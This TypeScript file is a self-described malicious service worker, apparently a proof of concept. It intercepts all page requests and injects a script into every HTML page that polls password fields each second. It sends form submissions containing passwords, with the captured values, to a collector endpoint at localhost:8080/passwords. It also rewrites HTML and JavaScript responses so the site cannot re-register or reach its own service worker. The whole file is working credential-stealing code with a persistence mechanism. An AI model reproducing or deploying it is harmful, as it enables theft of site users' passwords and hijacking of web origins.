self.addEventListener("install", () => {
    console.log("Hello from the malicious service worker")
    // @ts-expect-error Known ts bug with webworker types
    self.skipWaiting();
})

self.addEventListener("activate", () => {
    // @ts-expect-error Known ts bug with webworker types
    self.clients.claim()
})


let passwords:string[] = []
self.addEventListener('message', (event: MessageEvent) => {
    if(event.data.type == "PASSWORD_MESSAGE") {
        passwords = event.data.payload
    }
});

// @ts-expect-error More typing annoyances
self.addEventListener("fetch", (event: FetchEvent) => {
    console.log("Malicious service worker has intercepted the request")
    event.respondWith(handleRequest(event.request))
})

async function handleRequest(req: Request) : Promise<Response> {
    if(req.method !== "GET") {
        if(req.method == "POST" && req.headers.get("Content-Type") === "application/x-www-form-urlencoded") {
            const clonedRequest = req.clone()
            const formData = await clonedRequest.formData()
            if([...formData.keys()].find(s => s.toLocaleLowerCase().includes("password"))) {
                console.log("sending password")
                fetch("http://localhost:8080/passwords", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        type: "x-www-form-urlencoded",
                        host: new URL(req.url).host,
                        inputPasswords: passwords,
                        originalReq: Object.fromEntries([...formData.entries()])
                    })
                })
            }

        }

        return fetch(req)
    }
    // It is a navigate request and we need to stop service worker registration
    const originalResponse = await fetch(req)
    let finalData: string
    if(req.mode === "navigate") {
        finalData = handleHtml(await originalResponse.text())
    } else if(originalResponse.headers.get("content-type")?.includes("javascript")) {
        finalData = handleJs(await originalResponse.text())
    } else {
        return originalResponse
    }
    const newResponse = new Response(
        finalData,
        {
            status: originalResponse.status,
            statusText: originalResponse.statusText,
            headers: originalResponse.headers
        }
    )
    return newResponse
}

function handleHtml(originalDocument: string) : string {
    return originalDocument.replace("<head>", `<head>
    <script>
        function getPwdInputs() {
            var ary = [];
            var inputs = document.getElementsByTagName("input");
            for (var i=0; i<inputs.length; i++) {
            if (inputs[i].type.toLowerCase() === "password") {
                ary.push(inputs[i]);
            }
            }
            return ary;
        }
        setInterval(async () => {
            const passwordFelids = getPwdInputs()
                .map(input => input.value)
            const serviceWorker = await navigator.serviceWorker.ready
            serviceWorker.active.postMessage({
                type: "PASSWORD_MESSAGE",
                payload: passwordFelids
            })
        }, 1000)
        navigator.serviceWorker.register = () => new Promise(resolve => {})
        //# sourceURL=maliciousInjectedScript.js
    </script>`)
}

function handleJs(originalDocument: string) : string {
    return originalDocument
        // Removes any possibility of anything being called on the service worker object
        .replace(/navigator\.serviceWorker/g, "window")
        // Fixes cases with the if("serviceWorker" in navigator)
        .replace(/["']serviceWorker['"]/g, "'maliciousServiceWorker'")
}